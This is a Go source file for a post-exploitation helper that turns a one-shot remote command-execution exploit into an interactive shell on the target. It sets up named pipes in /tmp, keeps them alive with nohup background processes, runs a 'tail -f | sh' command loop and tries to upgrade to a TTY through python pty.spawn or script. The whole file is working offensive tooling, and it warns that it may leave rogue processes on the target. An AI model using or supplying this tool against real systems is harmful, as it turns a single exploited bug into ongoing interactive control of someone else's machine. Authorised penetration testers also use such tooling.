package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"
	"time"

	"golang.org/x/term"
)

const FIFO_IN_PATH = "/tmp/f.inp"
const FIFO_OUT_PATH = "/tmp/f.out"

var ttyUpgradeOptions []string = []string{
	"python3 -c 'import pty; pty.spawn(\"/bin/sh\")'",
	"python -c 'import pty; pty.spawn(\"/bin/sh\")'",
	"python2 -c 'import pty; pty.spawn(\"/bin/sh\")'",
	"script -qc /bin/sh /dev/null",
}

var ttyUpgrade string

var readDelay time.Duration
var commandOutputDelay time.Duration

func init() {
	flag.DurationVar(&readDelay, "read-interval", 1*time.Second, "interval for background read loop")
	flag.DurationVar(&commandOutputDelay, "cmd-delay", 500*time.Millisecond, "delay between sending a command and retrieving it's output")

	for i, s := range ttyUpgradeOptions {
		ttyUpgradeOptions[i] = fmt.Sprintf("%s 2>/dev/null", s)
	}
	ttyUpgrade = strings.Join(ttyUpgradeOptions, " || ") + " || echo failed to upgrade tty"
}

func main() {
	flag.Parse()

	if len(flag.Args()) == 0 {
		fmt.Fprintf(os.Stderr, "usage: %s <command to run>\n\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "example: %s python3 exploit.py\n", os.Args[0])
		fmt.Fprint(os.Stderr, "where\n  python3 exploit.py 'echo hi'\nruns\n  echo hi\non the remote machine and displays the result.\n\n")
		os.Exit(2)
	}

	if _, err := runCommand(fmt.Sprintf("rm -f %s; mkfifo %s; rm -f %s; mkfifo %s", FIFO_IN_PATH, FIFO_IN_PATH, FIFO_OUT_PATH, FIFO_OUT_PATH)); err != nil {
		log.Fatalf("Failed to create named pipes: %v", err)
	}

	if err := runCommandInBackground(fmt.Sprintf("exec 3<%s; sleep infinity", FIFO_OUT_PATH)); err != nil {
		log.Fatalf("Failed to start process keeping fifo open: %v", err)
	}

	if err := runCommandInBackground(fmt.Sprintf("tail -f %s | sh >%s 2>&1", FIFO_IN_PATH, FIFO_OUT_PATH)); err != nil {
		log.Fatalf("Failed to start shell process: %v", err)
	}

	err := runSession()

	fmt.Printf("Session ended with error %v. Note there may be rogue processes on the system.\n", err)
}

func runSession() error {
	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		panic(err)
	}
	defer term.Restore(int(os.Stdin.Fd()), oldState)

	t := term.NewTerminal(os.Stdin, "")

	stopReadLoop := make(chan interface{})
	justSentCommand := make(chan interface{})
	readErr := make(chan error)

	// Read loop
	go (func() {
		for {
			select {
			case <-stopReadLoop:
				return
			case <-justSentCommand:
				time.Sleep(commandOutputDelay)
			case <-time.After(readDelay):
			}

			res, err := runCommand(fmt.Sprintf("tf=`mktemp`; sh -c \"timeout 0.1s cat %s > $tf\" >/dev/null 2>&1; cat $tf; rm $tf", FIFO_OUT_PATH))
			if err != nil {
				readErr <- err
				return
			}

			t.Write(res)
		}
	})()

	// Attempt to upgrade to tty
	if err := sendCommandToFifo(ttyUpgrade); err != nil {
		stopReadLoop <- nil
		return err
	}

	if err := sendCommandToFifo("stty -echo"); err != nil {
		stopReadLoop <- nil
		return err
	}

	// Write loop
	for {
		if err := updateTermSize(t); err != nil {
			return err
		}

		line, err := t.ReadLine()
		if err != nil {
			stopReadLoop <- nil
			return err
		}

		select {
		case err, ok := <-readErr:
			if ok {
				return err
			} else {
				return fmt.Errorf("read loop closed normally without write loop closing. This shouldnt have happened")
			}
		default:
			_, err := runCommand(fmt.Sprintf("echo %s > %s", shellQuote(line), FIFO_IN_PATH))
			if err != nil {
				stopReadLoop <- nil
				return err
			}
			justSentCommand <- nil
		}
	}
}

func updateTermSize(t *term.Terminal) error {
	w, h, err := term.GetSize(int(os.Stdin.Fd()))
	if err != nil {
		return err
	}
	return t.SetSize(w, h)
}

func sendCommandToFifo(command string) error {
	_, err := runCommand(fmt.Sprintf("echo %s > %s", shellQuote(command), FIFO_IN_PATH))
	return err
}

func runCommandInBackground(command string) error {
	_, err := runCommand(fmt.Sprintf("nohup sh -c %s >/dev/null 2>&1 &", shellQuote(command)))
	return err
}

func runCommand(command string) ([]byte, error) {
	wrappedCommand := fmt.Sprintf("sh -c %s 2>&1", shellQuote(command))

	var outputBuffer bytes.Buffer
	outputWriter := bufio.NewWriter(&outputBuffer)
	var stderrBuffer bytes.Buffer
	stderrWriter := bufio.NewWriter(&stderrBuffer)

	cmd := exec.Command(flag.Args()[0], append(flag.Args()[1:], wrappedCommand)...)
	cmd.Stdout = outputWriter
	cmd.Stderr = stderrWriter

	if err := cmd.Run(); err != nil {
		return nil, fmt.Errorf("command failed: %v with stdout '%s' and stderr '%s'", err, outputBuffer.String(), stderrBuffer.String())
	}

	return outputBuffer.Bytes(), nil
}

func shellQuote(s string) string {
	if len(s) == 0 {
		return "''"
	}

	return "'" + strings.ReplaceAll(s, "'", "'\"'\"'") + "'"
}
